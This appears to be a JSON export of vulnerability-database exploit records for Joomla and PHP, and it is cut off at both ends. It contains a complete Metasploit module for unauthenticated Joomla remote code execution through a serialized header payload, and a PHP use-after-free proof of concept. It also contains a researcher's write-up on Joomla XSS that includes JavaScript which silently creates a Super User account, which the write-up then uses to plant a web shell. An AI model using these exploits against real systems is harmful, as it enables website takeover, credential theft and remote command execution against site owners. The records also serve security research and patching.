22_44_10.png)\r\n\r\n\u7136\u540e\u4e0a\u4f20\u6587\u4ef6\uff0c\u8fd9\u91cc\u628aPOST\u7684xxname\u53c2\u6570\u5229\u7528\u7a7a\u5b57\u7b26\u8fdb\u884c\u622a\u65ad\u3002\r\n\r\n\u5982\u4e0b\u56fe\u6240\u793a\uff1a\r\n\r\n![](https://images.seebug.org/contribute/51338806-f32b-4c00-af46-9d3f5c665c04-2015-09-22 22_44_54.png)\r\n\r\n\u6211\u4eec\u53ef\u4ee5\u770b\u5230\uff0c\u6587\u4ef6\u540d\u88ab\u6210\u529f\u622a\u65ad\uff0cphp\u811a\u672c\u4e0a\u4f20\u6210\u529f\u3002\r\n\r\n![](https://images.seebug.org/contribute/24e9d061-8957-4af3-a95c-d0369b995490-2015-09-22 22_45_44.png)\r\n\r\n\r\n### \u53d7\u5f71\u54cd\u7684php\u7248\u672c\r\n\r\n5.4.38~5.6.6\uff0c\u540c\u65f6\u7531\u4e8ephp 5.2\u7248\u672c\u672c\u8eab\u5c31\u53d7\u523000\u622a\u65ad\u6f0f\u6d1e\u7684\u5f71\u54cd\uff0c\u6240\u4ee5\u4e5f\u5728\u53d7\u5f71\u54cd\u7684\u884c\u5217\u4e4b\u4e2d\u3002\r\n\r\n### \u53c2\u8003\u94fe\u63a5\uff1a\r\nhttp://bobao.360.cn/news/detail/1383.html",
            "modified": "2015-10-10T00:00:00",
            "published": "2015-10-10T00:00:00",
            "href": "https://www.seebug.org/vuldb/ssvid-89630",
            "id": "SSV:89630",
            "type": "seebug",
            "title": "PHP\u591a\u7248\u672c\uff085.2,5.4.38~5.6.6\uff09\u4efb\u610f\u6587\u4ef6\u4e0a\u4f20\u6f0f\u6d1e",
            "sourceData": "",
            "cvss": {
                "score": 5.0,
                "vector": "AV:NETWORK/AC:LOW/Au:NONE/C:NONE/I:PARTIAL/A:NONE/"
            },
            "vhref": "https://vulners.com/seebug/SSV:89630"
        }
    ],
    "CVE-2015-6835": [
        {
            "bulletinFamily": "exploit",
            "description": "",
            "modified": "2015-12-17T00:00:00",
            "published": "2015-12-17T00:00:00",
            "href": "https://packetstormsecurity.com/files/134949/Joomla-HTTP-Header-Unauthenticated-Remote-Code-Execution.html",
            "id": "PACKETSTORM:134949",
            "type": "packetstorm",
            "title": "Joomla HTTP Header Unauthenticated Remote Code Execution",
            "sourceData": "`##  \n# This module requires Metasploit: http://metasploit.com/download  \n# Current source: https://github.com/rapid7/metasploit-framework  \n##  \n  \nrequire 'msf/core'  \n  \nclass Metasploit3 < Msf::Exploit::Remote  \nRank = ExcellentRanking  \n  \ninclude Msf::Exploit::Remote::HttpClient  \n  \ndef initialize(info = {})  \nsuper(update_info(info,  \n'Name' => 'Joomla HTTP Header Unauthenticated Remote Code Execution',  \n'Description' => %q{  \nJoomla suffers from an unauthenticated remote code execution that affects all versions from 1.5.0 to 3.4.5.  \nBy storing user supplied headers in the databases session table it's possible to truncate the input  \nby sending an UTF-8 character. The custom created payload is then executed once the session is read  \nfrom the databse. You also need to have a PHP version before 5.4.45 (including 5.3.x), 5.5.29 or 5.6.13.  \nIn later versions the deserialisation of invalid session data stops on the first error and the  \nexploit will not work. The PHP Patch was included in Ubuntu versions 5.5.9+dfsg-1ubuntu4.13 and  \n5.3.10-1ubuntu3.20 and in Debian in version 5.4.45-0+deb7u1.  \n},  \n'Author' =>  \n[  \n'Marc-Alexandre Montpas', # discovery  \n'Christian Mehlmauer' # metasploit module  \n],  \n'License' => MSF_LICENSE,  \n'References' =>  \n[  \n['CVE', '2015-8562'],  \n['URL', 'https://blog.sucuri.net/2015/12/joomla-remote-code-execution-the-details.html'],  \n['URL', 'https://blog.sucuri.net/2015/12/remote-command-execution-vulnerability-in-joomla.html'],  \n['URL', 'https://developer.joomla.org/security-centre/630-20151214-core-remote-code-execution-vulnerability.html'],  \n['URL', 'https://translate.google.com/translate?hl=en&sl=auto&tl=en&u=http%3A%2F%2Fdrops.wooyun.org%2Fpapers%2F11330'],  \n['URL', 'https://translate.google.com/translate?hl=en&sl=auto&tl=en&u=http%3A%2F%2Fwww.freebuf.com%2Fvuls%2F89754.html'],  \n['URL', 'https://bugs.php.net/bug.php?id=70219']  \n],  \n'Privileged' => false,  \n'Platform' => 'php',  \n'Arch' => ARCH_PHP,  \n'Targets' => [['Joomla 1.5.0 - 3.4.5', {}]],  \n'DisclosureDate' => 'Dec 14 2015',  \n'DefaultTarget' => 0)  \n)  \n  \nregister_options(  \n[  \nOptString.new('TARGETURI', [ true, 'The path to joomla', '/' ]),  \nOptEnum.new('HEADER', [ true, 'The header to use for exploitation', 'USER-AGENT', [ 'USER-AGENT', 'X-FORWARDED-FOR' ]])  \n], self.class)  \n  \nregister_advanced_options(  \n[  \nOptBool.new('FORCE', [true, 'Force run even if check reports the service is safe.', false]),  \n], self.class)  \nend  \n  \ndef check  \nres = send_request_cgi({'uri' => target_uri.path })  \n  \nunless res  \nvprint_error(\"Connection timed out\")  \nreturn Exploit::CheckCode::Unknown  \nend  \n  \nunless res.headers['X-Powered-By']  \nvprint_error(\"Unable to determine the PHP version.\")  \nreturn Exploit::CheckCode::Unknown  \nend  \n  \nphp_version, rest = res.headers['X-Powered-By'].scan(/PHP\\/([\\d\\.]+)(?:-(.+))?/i).flatten || ''  \nversion = Gem::Version.new(php_version)  \nvulnerable = false  \n  \n# check for ubuntu and debian specific versions. Was fixed in  \n# * 5.5.9+dfsg-1ubuntu4.13  \n# * 5.3.10-1ubuntu3.20  \n# * 5.4.45-0+deb7u1  \n# Changelogs (search for CVE-2015-6835 or #70219):  \n# http://changelogs.ubuntu.com/changelogs/pool/main/p/php5/php5_5.5.9+dfsg-1ubuntu4.13/changelog  \n# http://changelogs.ubuntu.com/changelogs/pool/main/p/php5/php5_5.3.10-1ubuntu3.20/changelog  \n# http://metadata.ftp-master.debian.org/changelogs/main/p/php5/php5_5.4.45-0+deb7u2_changelog  \nif rest && rest.include?('ubuntu')  \nsub_version = rest.scan(/^\\dubuntu([\\d\\.]+)/i).flatten.first || ''  \nvprint_status(\"Found Ubuntu PHP version #{res.headers['X-Powered-By']}\")  \n  \nif version > Gem::Version.new('5.5.9')  \nvulnerable = false  \nelsif version == Gem::Version.new('5.5.9') && Gem::Version.new(sub_version) >= Gem::Version.new('4.13')  \nvulnerable = false  \nelsif version == Gem::Version.new('5.3.10') && Gem::Version.new(sub_version) >= Gem::Version.new('3.20')  \nvulnerable = false  \nelse  \nvulnerable = true  \nend  \nelsif rest && rest.include?('+deb')  \nsub_version = rest.scan(/^\\d+\\+deb([\\du]+)/i).flatten.first || ''  \nvprint_status(\"Found Debian PHP version #{res.headers['X-Powered-By']}\")  \n  \nif version > Gem::Version.new('5.4.45')  \nvulnerable = false  \nelsif version == Gem::Version.new('5.4.45') && sub_version != '7u1'  \nvulnerable = false  \nelse  \nvulnerable = true  \nend  \nelse  \nvprint_status(\"Found PHP version #{res.headers['X-Powered-By']}\")  \nvulnerable = true if version <= Gem::Version.new('5.4.44')  \nvulnerable = true if version.between?(Gem::Version.new('5.5.0'), Gem::Version.new('5.5.28'))  \nvulnerable = true if version.between?(Gem::Version.new('5.6.0'), Gem::Version.new('5.6.12'))  \nend  \n  \nunless vulnerable  \nvprint_error('This module currently does not work against this PHP version')  \nreturn Exploit::CheckCode::Safe  \nend  \n  \nres = send_request_cgi({'uri' => normalize_uri(target_uri.path, 'administrator', 'manifests', 'files', 'joomla.xml') })  \nif res && res.code == 200 && res.body && res.body.include?('<author>Joomla! Project</author>')  \njoomla_version = res.body.scan(/<version>([\\d\\.]+)<\\/version>/i).flatten.first || ''  \nunless joomla_version.empty?  \nvprint_status(\"Detected Joomla version #{joomla_version}\")  \nreturn Exploit::CheckCode::Appears if Gem::Version.new(joomla_version) < Gem::Version.new('3.4.6')  \nend  \nend  \n  \nres.get_html_meta_elements.each do |element|  \nif element.attributes['name'] &&  \n/^generator$/i === element.attributes['name'] &&  \nelement.attributes['content'] &&  \n/joomla/i === element.attributes['content'].value  \nreturn Exploit::CheckCode::Detected  \nend  \nend  \n  \nExploit::CheckCode::Safe  \nend  \n  \n# gets a random 4 byte UTF-8 character  \ndef get_terminator  \n# valid codepoints for 4byte UTF-8 chars: U+010000 - U+10FFFF  \n[rand(0x10000..0x10ffff)].pack('U*')  \nend  \n  \ndef get_payload(header_name)  \npre = \"#{Rex::Text.rand_text_alpha(5)}}__#{Rex::Text.rand_text_alpha(10)}|\"  \npre_pay = 'O:21:\"JDatabaseDriverMysqli\":3:{s:4:\"\\0\\0\\0a\";O:17:\"JSimplepieFactory\":0:{}s:21:\"\\0\\0\\0disconnectHandlers\";a:1:{i:0;a:2:{i:0;O:9:\"SimplePie\":5:{s:8:\"sanitize\";O:20:\"JDatabaseDriverMysql\":0:{}s:5:\"cache\";b:1;s:19:\"cache_name_function\";s:6:\"assert\";s:10:\"javascript\";i:9999;s:8:\"feed_url\";'  \npay = \"eval(base64_decode($_SERVER['HTTP_#{header_name}']));JFactory::getConfig();exit;\"  \npost_pay = '\";}i:1;s:4:\"init\";}}s:13:\"\\0\\0\\0connection\";i:1;}'  \nt1000 = get_terminator  \nreturn \"#{pre}#{pre_pay}s:#{pay.length}:\\\"#{pay}#{post_pay}#{t1000}\"  \nend  \n  \ndef print_status(msg='')  \nsuper(\"#{peer} - #{msg}\")  \nend  \n  \ndef print_error(msg='')  \nsuper(\"#{peer} - #{msg}\")  \nend  \n  \ndef exploit  \nif check == Exploit::CheckCode::Safe && datastore['FORCE'] == false  \nprint_error('Target seems safe, so we will not continue.')  \nreturn  \nend  \n  \nprint_status(\"Sending payload ...\")  \nheader_name = Rex::Text.rand_text_alpha_upper(5)  \nres = send_request_cgi({  \n'method' => 'GET',  \n'uri' => target_uri.path,  \n'headers' => { datastore['HEADER'] => get_payload(header_name) }  \n})  \nfail_with(Failure::Unknown, 'No response') if res.nil?  \nsession_cookie = res.get_cookies  \nsend_request_cgi({  \n'method' => 'GET',  \n'uri' => target_uri.path,  \n'cookie' => session_cookie,  \n'headers' => {  \nheader_name => Rex::Text.encode_base64(payload.encoded)  \n}  \n})  \nend  \nend  \n`\n",
            "cvss": {
                "score": 7.5,
                "vector": "AV:NETWORK/AC:LOW/Au:NONE/C:PARTIAL/I:PARTIAL/A:PARTIAL/"
            },
            "vhref": "https://vulners.com/packetstorm/PACKETSTORM:134949"
        },
        {
            "bulletinFamily": "exploit",
            "description": "PHP Session Deserializer Use-After-Free. CVE-2015-6835. Dos exploit for php platform",
            "modified": "2015-09-09T00:00:00",
            "published": "2015-09-09T00:00:00",
            "id": "EDB-ID:38123",
            "href": "https://www.exploit-db.com/exploits/38123/",
            "type": "exploitdb",
            "title": "PHP Session Deserializer Use-After-Free",
            "sourceData": "Use After Free Vulnerabilities in Session Deserializer\r\n\r\nTaoguang Chen <[@chtg](http://github.com/chtg)> \r\nWrite Date: 2015.8.9\r\nRelease Date: 2015.9.4\r\n\r\nMultiple use-after-free vulnerabilities were discovered in session deserializer (php/php_binary/php_serialize) that can be abused for leaking arbitrary memory blocks or execute arbitrary code remotely.\r\n\r\nAffected Versions\r\n------------\r\nAffected is PHP 5.6 < 5.6.13\r\nAffected is PHP 5.5 < 5.5.29\r\nAffected is PHP 5.4 < 5.4.45\r\n\r\nCredits\r\n------------\r\nThis vulnerability was disclosed by Taoguang Chen.\r\n\r\nDescription\r\n------------\r\n\r\nPS_SERIALIZER_DECODE_FUNC(php) /* {{{ */\r\n{\r\n\r\n  ...  \r\n\r\n  PHP_VAR_UNSERIALIZE_INIT(var_hash);\r\n\r\n  p = val;\r\n\r\n  while (p < endptr) {\r\n    \r\n    ...\r\n\r\n    if (has_value) {\r\n      ALLOC_INIT_ZVAL(current);\r\n      if (php_var_unserialize(&current, (const unsigned char **) &q,\r\n(const unsigned char *) endptr, &var_hash TSRMLS_CC)) {\r\n        php_set_session_var(name, namelen, current, &var_hash  TSRMLS_CC);\r\n      }\r\n      zval_ptr_dtor(&current);\r\n    }\r\n    PS_ADD_VARL(name, namelen);\r\nskip:\r\n    efree(name);\r\n\r\n    p = q;\r\n  }\r\nbreak_outer_loop:\r\n\r\n  PHP_VAR_UNSERIALIZE_DESTROY(var_hash);\r\n\r\n  return SUCCESS;\r\n}\r\n\r\n\r\nWhen session deserializer (php/php_binary) deserializing multiple data\r\nit will call to php_var_unserialize() multiple times. So we can create\r\nZVAL and free it via the php_var_unserialize() with a crafted\r\nserialized string, and also free the memory (reduce the reference\r\ncount of the ZVAL to zero) via zval_ptr_dtor() with deserialize two\r\nidentical session data, then the next call to php_var_unserialize()\r\nwill still allow to use R: or r: to set references to that already\r\nfreed memory. It is possible to use-after-free attack and execute\r\narbitrary code remotely.\r\n\r\nIn some other cases, session deserializer\r\n(php/php_binary/php_serialize) may also lead to use-after-free\r\nvulnerabilities: i) via crafted Serializable::unserialize() ii) via\r\nunserialize()'s callback function and zend_lookup_class() call a\r\ncrafted __autoload().\r\n\r\nProof of Concept Exploit\r\n------------\r\nThe PoC works on standard MacOSX 10.11 installation of PHP 5.4.44.\r\n\r\n\r\n<?php\r\n\r\nsession_start();\r\n\r\n$fakezval = ptr2str(1122334455);\r\n$fakezval .= ptr2str(0);\r\n$fakezval .= \"\\x00\\x00\\x00\\x00\";\r\n$fakezval .= \"\\x01\";\r\n$fakezval .= \"\\x00\";\r\n$fakezval .= \"\\x00\\x00\";\r\n\r\n$exploit = 'ryat|a:2:{i:0;i:1;i:1;a:1:{i:1;chtg|a:1:{i:0;R:4;}';\r\n// $exploit = 'ryat|a:1:{i:0;i:1;}ryat|i:1;chtg|R:1;';\r\nsession_decode($exploit);\r\n\r\nfor ($i = 0; $i < 5; $i++) {\r\n    $v[$i] = $fakezval.$i;\r\n}\r\n\r\nvar_dump($_SESSION);\r\n\r\nfunction ptr2str($ptr)\r\n{\r\n  $out = \"\";\r\n  for ($i = 0; $i < 8; $i++) {\r\n    $out .= chr($ptr & 0xff);\r\n    $ptr >>= 8;\r\n  }\r\n  return $out;\r\n}\r\n\r\n?>\r\n\r\n\r\nTest the PoC on the command line:\r\n\r\n\r\n$ php uafpoc.php\r\narray(2) {\r\n  [\"ryat\"]=>\r\n  NULL\r\n  [\"chtg\"]=>\r\n  array(1) {\r\n    [0]=>\r\n    int(1122334455)  <===  so we can control the memory and create fake ZVAL :)\r\n  }\r\n}\r\n\r\n",
            "cvss": {
                "score": 0.0,
                "vector": "NONE"
            },
            "vhref": "https://vulners.com/exploitdb/EDB-ID:38123"
        }
    ],
    "CVE-2017-7986": [
        {
            "bulletinFamily": "exploit",
            "description": "Joomla! is one of the world's most popular content management system (CMS) solutions. It enables users to build custom Web sites and powerful online applications. More than 3 percent of Web sites are running Joomla!, and it accounts for more than 9 percent of CMS market share.\r\n\r\nAs of November 2016, Joomla! had been downloaded over 78 million times. Over 7,800 free and commercial extensions are also currently available from the official Joomla! Extension Directory, and more are available from other sources.\r\n\r\nThis year, as a FortiGuard researcher I discovered and reported two Cross-Site Scripting (XSS) vulnerabilities in Joomla!. They are identified as CVE-2017-7985 and CVE-2017-7986. Joomla! patched them  this week. These vulnerabilities affect Joomla! versions 1.5.0 through 3.6.5. They exist because these versions of Joomla! fail to sanitize malicious user input when users post or edit an article. Remote attacker could exploit them to run malicious code in victims\u2019 browser, potentially allowing the attacker to gain control of the victim\u2019s Joomla! account. If the victim has higher permission, like system administrator, the remote attacker could gain full control of the web server.\r\n\r\nIn this blog, I will share the details of these vulnerabilities.\r\n\r\n### Background\r\nJoomla! has its own XSS filters. For example, a user with post permission is not allowed to use full HTML elements. When this user posts an article with HTML attributes, Joomla! will sterilize dangerous code like \u201cjavascript:alert()\u201d, \u201cbackground:url()\u201d and so on. Joomla! has two ways to achieve this sterilization. On the client side, it uses the editor called \u201cTinyMCE.\u201d On the server side, it sanitizes the request before storing it on the server.\r\n\r\n### Analysis\r\nTo demonstrate these vulnerabilities, the test account \u2018yzy1\u2019 is created. It has author permission, which is not allowed to use full HTML elements.\r\n\r\nTo bypass the client side sterilization, the attacker can use a network intercept tool like Burp Suite or just change the default editor to other Joomla! built-in editors, like CoodeMirror or None, as shown in Figure 1.\r\n\r\n\r\n![Figure1](https://d3gpjj9d20n0p3.cloudfront.net/ngblog/uploads/files/JoomlaCoreXSS001.png)\r\nFigure 1. Bypassing the client side XSS filter\r\n\r\nOn the server side, I found two ways to bypass the XSS filters. They are identified as CVE-2017-7985 and CVE-2017-7986.\r\n\r\n### CVE-2017-7985\r\nThe Joomla! server side XSS filter sterilizes dangerous code and saves the safe characters. For example, when we post the following code with the test account,  Joomla! sterilizes it by double quoting the , deleting the , and adding safe links to the URLs, as shown in Figure 2.\r\n\r\n\r\n![Figure2](https://d3gpjj9d20n0p3.cloudfront.net/ngblog/uploads/files/JoomlaCoreXSS003.png)\r\nFigure 2. Joomla! XSS filter\r\n\r\nBut an attacker could take advantage of the filter by trying to let the filter to reconstruct the code and rebuild the scripts. For example, we can add the code Note that the double quote in  is the CORRECT DOUBLE QUOTATION MARK, as shown in Figure 3.\r\n\r\n\r\n![Figure3](https://d3gpjj9d20n0p3.cloudfront.net/ngblog/uploads/files/JoomlaCoreXSS005.png)\r\nFigure 3. Inserting the PoC for CVE-2017-7985\r\n\r\nWhen victims access the post, regardless of whether it\u2019s published or not, the inserted XSS code will be triggered in both the main page and the administrator page, as shown in Figures 4 and 5.\r\n\r\n\r\n![Figure4](https://d3gpjj9d20n0p3.cloudfront.net/ngblog/uploads/files/JoomlaCoreXSS007.jpg)\r\nFigure 4. CVE-2017-7985 PoC triggered in the home page\r\n\r\n![Figure5](https://d3gpjj9d20n0p3.cloudfront.net/ngblog/uploads/files/JoomlaCoreXSS009.png)\r\n\r\nFigure 5. CVE-2017-7985 PoC triggered in the administrator page\r\n\r\n### Solution\r\nAll users of Joomla! should upgrade to the latest version immediately. Additionally, organizations that have deployed Fortinet IPS solutions are already protected from these vulnerabilities with the signatures Joomla!.Core.Article.Post.Colon.Char.XSS and Joomla!.Core.Article.Post.Quote.Char.XSS.",
            "modified": "2017-05-08T00:00:00",
            "published": "2017-05-08T00:00:00",
            "href": "https://www.seebug.org/vuldb/ssvid-93081",
            "id": "SSV:93081",
            "type": "seebug",
            "title": "Joomla! Core XSS Vulnerability(CVE-2017-7985)",
            "sourceData": "",
            "cvss": {
                "score": 4.3,
                "vector": "AV:NETWORK/AC:MEDIUM/Au:NONE/C:NONE/I:PARTIAL/A:NONE/"
            },
            "vhref": "https://vulners.com/seebug/SSV:93081"
        },
        {
            "bulletinFamily": "exploit",
            "description": "Joomla! is one of the world's most popular content management system (CMS) solutions. It enables users to build custom Web sites and powerful online applications. More than 3 percent of Web sites are running Joomla!, and it accounts for more than 9 percent of CMS market share.\r\n\r\nAs of November 2016, Joomla! had been downloaded over 78 million times. Over 7,800 free and commercial extensions are also currently available from the official Joomla! Extension Directory, and more are available from other sources.\r\n\r\nThis year, as a FortiGuard researcher I discovered and reported two Cross-Site Scripting (XSS) vulnerabilities in Joomla!. They are identified as CVE-2017-7985 and CVE-2017-7986. Joomla! patched them  this week. These vulnerabilities affect Joomla! versions 1.5.0 through 3.6.5. They exist because these versions of Joomla! fail to sanitize malicious user input when users post or edit an article. Remote attacker could exploit them to run malicious code in victims\u2019 browser, potentially allowing the attacker to gain control of the victim\u2019s Joomla! account. If the victim has higher permission, like system administrator, the remote attacker could gain full control of the web server.\r\n\r\nIn this blog, I will share the details of these vulnerabilities.\r\n\r\n### Background\r\nJoomla! has its own XSS filters. For example, a user with post permission is not allowed to use full HTML elements. When this user posts an article with HTML attributes, Joomla! will sterilize dangerous code like \u201cjavascript:alert()\u201d, \u201cbackground:url()\u201d and so on. Joomla! has two ways to achieve this sterilization. On the client side, it uses the editor called \u201cTinyMCE.\u201d On the server side, it sanitizes the request before storing it on the server.\r\n\r\n### Analysis\r\nTo demonstrate these vulnerabilities, the test account \u2018yzy1\u2019 is created. It has author permission, which is not allowed to use full HTML elements.\r\n\r\nTo bypass the client side sterilization, the attacker can use a network intercept tool like Burp Suite or just change the default editor to other Joomla! built-in editors, like CoodeMirror or None, as shown in Figure 1.\r\n\r\n\r\n![Figure1](https://d3gpjj9d20n0p3.cloudfront.net/ngblog/uploads/files/JoomlaCoreXSS001.png)\r\nFigure 1. Bypassing the client side XSS filter\r\n\r\nOn the server side, I found two ways to bypass the XSS filters. They are identified as CVE-2017-7985 and CVE-2017-7986.\r\n\r\n### CVE-2017-7986\r\nWhen posting an article, the attacker could bypass the XSS filter in an HTML  tag by changing the script from  to , because the  is the mark \u201c:\u201d in HTML format. The attacker could then trigger this script code by adding a  tag. For example, the attacker can insert the following code in an article , as shown in Figure 6. \r\n\r\n \r\n\r\n\r\n![Figure6](https://d3gpjj9d20n0p3.cloudfront.net/ngblog/uploads/files/JoomlaCoreXSS011.png)\r\nFigure 6. Insert the PoC for CVE-2017-7986\r\n\r\nWhen victims access the post, regardless of whether it\u2019s published or not, and click the \u201cClick Me\u201d button, the inserted XSS code will be triggered in both the main page and the administrator page, as shown in Figures 7 and 8.\r\n\r\n\r\n![Figure7](https://d3gpjj9d20n0p3.cloudfront.net/ngblog/uploads/files/JoomlaCoreXSS013.png)\r\nFigure 7. CVE-2017-7986 PoC triggered in home page\r\n\r\n\r\n![Figure8](https://d3gpjj9d20n0p3.cloudfront.net/ngblog/uploads/files/JoomlaCoreXSS015.png)\r\nFigure 8. CVE-2017-7986 PoC triggered in administrator page\r\n\r\nExploit\r\nHere I provide an exploit example for CVE-2017-7986 that allows an attacker with a low permission account to create a Super User account and upload a web shell. To achieve this, I will write a small piece of JavaScript code for creating a Super User account by using the site administrator\u2019s permission. It first obtains the CSRF token from the user edit page , and then posts the Super User account creation request to the server with the stolen CSRF token. The new Super User will be \u2018Fortinet Yzy\u2019 with the password \u2018test\u2019.\r\n```\r\nvar request = new XMLHttpRequest();\r\nvar req = new XMLHttpRequest();\r\nvar id = '';\r\nvar boundary = Math.random().toString().substr(2);\r\nvar space = \"-----------------------------\";\r\n\r\nrequest.open('GET', 'index.php?option=com_users&view=user&layout=edit', true);\r\nrequest.onload = function() {\r\n    if (request.status >= 200 && request.status < 400) {\r\n        var resp = request.responseText;\r\n        var myRegex = /<input type=\"hidden\" name=\"([a-z0-9]+)\" value=\"1\" \\/>/;\r\n        id = myRegex.exec(resp)[1];\r\n        req.open('POST', 'index.php?option=com_users&layout=edit&id=0', true);\r\n        req.setRequestHeader(\"content-type\", \"multipart/form-data; boundary=---------------------------\" + boundary);\r\n        var multipart = space + boundary +\r\n            \"\\r\\nContent-Disposition: form-data; name=\\\"jform[name]\\\"\" +\r\n            \"\\r\\n\\r\\nFortinet Yzy\\r\\n\" +\r\n            space + boundary +\r\n            \"\\r\\nContent-Disposition: form-data; name=\\\"jform[username]\\\"\" +\r\n            \"\\r\\n\\r\\nfortinetyzy\\r\\n\" +\r\n            space + boundary +\r\n            \"\\r\\nContent-Disposition: form-data; name=\\\"jform[password]\\\"\" +\r\n            \"\\r\\n\\r\\ntest\\r\\n\" +\r\n            space + boundary +\r\n            \"\\r\\nContent-Disposition: form-data; name=\\\"jform[password2]\\\"\" +\r\n            \"\\r\\n\\r\\ntest\\r\\n\" +\r\n            space + boundary +\r\n            \"\\r\\nContent-Disposition: form-data; name=\\\"jform[email]\\\"\" +\r\n            \"\\r\\n\\r\\nzyg@gmail.com\\r\\n\" +\r\n            space + boundary +\r\n            \"\\r\\nContent-Disposition: form-data; name=\\\"jform[registerDate]\\\"\" +\r\n            \"\\r\\n\\r\\n\\r\\n\" +\r\n            space + boundary +\r\n            \"\\r\\nContent-Disposition: form-data; name=\\\"jform[lastvisitDate]\\\"\" +\r\n            \"\\r\\n\\r\\n\\r\\n\" +\r\n            space + boundary +\r\n            \"\\r\\nContent-Disposition: form-data; name=\\\"jform[lastResetTime]\\\"\" +\r\n            \"\\r\\n\\r\\n\\r\\n\" +\r\n            space + boundary +\r\n            \"\\r\\nContent-Disposition: form-data; name=\\\"jform[resetCount]\\\"\" +\r\n            \"\\r\\n\\r\\n0\\r\\n\" +\r\n            space + boundary +\r\n            \"\\r\\nContent-Disposition: form-data; name=\\\"jform[sendEmail]\\\"\" +\r\n            \"\\r\\n\\r\\n0\\r\\n\" +\r\n            space + boundary +\r\n            \"\\r\\nContent-Disposition: form-data; name=\\\"jform[block]\\\"\" +\r\n            \"\\r\\n\\r\\n0\\r\\n\" +\r\n            space + boundary +\r\n            \"\\r\\nContent-Disposition: form-data; name=\\\"jform[requireReset]\\\"\" +\r\n            \"\\r\\n\\r\\n0\\r\\n\" +\r\n            space + boundary +\r\n            \"\\r\\nContent-Disposition: form-data; name=\\\"jform[id]\\\"\" +\r\n            \"\\r\\n\\r\\n0\\r\\n\" +\r\n            space + boundary +\r\n            \"\\r\\nContent-Disposition: form-data; name=\\\"jform[groups][]\\\"\" +\r\n            \"\\r\\n\\r\\n8\\r\\n\" +\r\n            space + boundary +\r\n            \"\\r\\nContent-Disposition: form-data; name=\\\"jform[params][admin_style]\\\"\" +\r\n            \"\\r\\n\\r\\n\\r\\n\" +\r\n            space + boundary +\r\n            \"\\r\\nContent-Disposition: form-data; name=\\\"jform[params][admin_language]\\\"\" +\r\n            \"\\r\\n\\r\\n\\r\\n\" +\r\n            space + boundary +\r\n            \"\\r\\nContent-Disposition: form-data; name=\\\"jform[params][language]\\\"\" +\r\n            \"\\r\\n\\r\\n\\r\\n\" +\r\n            space + boundary +\r\n            \"\\r\\nContent-Disposition: form-data; name=\\\"jform[params][editor]\\\"\" +\r\n            \"\\r\\n\\r\\n\\r\\n\" +\r\n            space + boundary +\r\n            \"\\r\\nContent-Disposition: form-data; name=\\\"jform[params][helpsite]\\\"\" +\r\n            \"\\r\\n\\r\\n\\r\\n\" +\r\n            space + boundary +\r\n            \"\\r\\nContent-Disposition: form-data; name=\\\"jform[params][timezone]\\\"\" +\r\n            \"\\r\\n\\r\\n\\r\\n\" +\r\n            space + boundary +\r\n            \"\\r\\nContent-Disposition: form-data; name=\\\"task\\\"\" +\r\n            \"\\r\\n\\r\\nuser.apply\\r\\n\" +\r\n            space + boundary +\r\n            \"\\r\\nContent-Disposition: form-data; name=\\\"\" + id + \"\\\"\" +\r\n            \"\\r\\n\\r\\n1\\r\\n\" +\r\n            space + boundary + \"--\\r\\n\";\r\n        req.onload = function() {\r\n            if (req.status >= 200 && req.status < 400) {\r\n                var resp = req.responseText;\r\n                console.log(resp);\r\n            }\r\n        };\r\n        req.send(multipart);\r\n    }\r\n};\r\n\r\nrequest.send();\r\n```\r\nAn attacker can add this code to Joomla! by exploiting this XSS vulnerability, as shown in Figure 9.\r\n![Figure9](https://d3gpjj9d20n0p3.cloudfront.net/ngblog/uploads/files/JoomlaCoreXSS017.png)\r\nOnce the site administrator triggers this XSS attack in the administrator page, a Super User account will be immediately created, as shown in Figures 10 and 11.\r\n\r\n\r\n![Figure10](https://d3gpjj9d20n0p3.cloudfront.net/ngblog/uploads/files/JoomlaCoreXSS019.jpg)\r\nFigure 10. Site administrator triggers the XSS attack in the administrator page\r\n\r\n\r\n![Figure11](https://d3gpjj9d20n0p3.cloudfront.net/ngblog/uploads/files/JoomlaCoreXSS021.png)\r\nFigure 11. A new Super User account is created by the attacker\r\n\r\nThe attacker can then login to Joomla! using this new Super User permission and upload a web shell by installing a plugin, as shown in Figures 12 and 13.\r\n\r\n\r\n![Figure12](https://d3gpjj9d20n0p3.cloudfront.net/ngblog/uploads/files/JoomlaCoreXSS023.png)\r\nFigure 12. Uploading a web shell using the attacker\u2019s Super User account\r\n\r\n\r\n![Figure13](https://d3gpjj9d20n0p3.cloudfront.net/ngblog/uploads/files/JoomlaCoreXSS025.jpg)\r\nFigure 13. Attacker accesses the web shell and executes commands\r\n\r\n### Solution\r\nAll users of Joomla! should upgrade to the latest version immediately. Additionally, organizations that have deployed Fortinet IPS solutions are already protected from these vulnerabilities with the signatures Joomla!.Core.Article.Post.Colon.Char.XSS and Joomla!.Core.Article.Post.Quote.Char.XSS.",
            "modified": "2017-05-08T00:00:00",
            "published": "2017-05-08T00:00:00",
            "href": "https://www.seebug.org/vuldb/ssvid-93082",
            "id": "SSV:93082",
            "type": "seebug",
            "title": "Joomla! Core XSS Vulnerability(CVE-2017-7986)",
            "sourceData": "",
            "cvss": {
                "score": 4.3,
                "vector": "AV:NETWORK/AC:MEDIUM/Au:NONE/C:NONE/I:PARTIAL/A:NONE/"
            },
            "vhref": "https://vulners.com/seebug/SSV:93082"
        }
    ],
    "CVE-2017-14596": [
        {
            "bulletinFamily": "exploit",
            "description": "Exploit for php platform in category web applications",
            "modified": "2017-09-25T00:00:00",
            "published": "2017-09-25T00:00:00",
            "href": "https://0day.today/exploit/description/28621",
            "id": "1337DAY-ID-28621",
            "type": "zdt",
            "title": "Joomla 3.7.5 LDAP Injection Vulnerability",
            "sourceData": "With over 84 million downloads, Joomla! is one of the most popular content management systems in the World Wide Web. It powers about 3.3% of all websites\u2019 content and articles. Our code analysis solution RIPS detected a previously unknown LDAP injection vulnerability in the login controller. This one vulnerability could allow remote attackers to leak the super user password with blind injection techniques and to fully take over any Joomla! <= 3.7.5 installation within seconds that uses LDAP for authentication. Joomla! has fixed the vulnerability in the latest version 3.8.\r\n\r\n\r\nRequirements - Who is affected\r\nInstallations with the following requirements are affected by this vulnerability:\r\n\r\nJoomla! version 1.5 <= 3.7.5 is installed\r\nJoomla! is configured to use LDAP for authentication\r\nThis is not a configuration flaw and an attacker does not need any privileges to exploit this vulnerability.\r\n\r\n\r\nImpact - What can an attacker do\r\nBy exploiting a vulnerability in the login page, an unprivileged remote attacker can efficiently extract all authentication credentials of the LDAP server that is used by the Joomla! installation. These include the username and password of the super user, the Joomla! administrator. An attacker can then use the 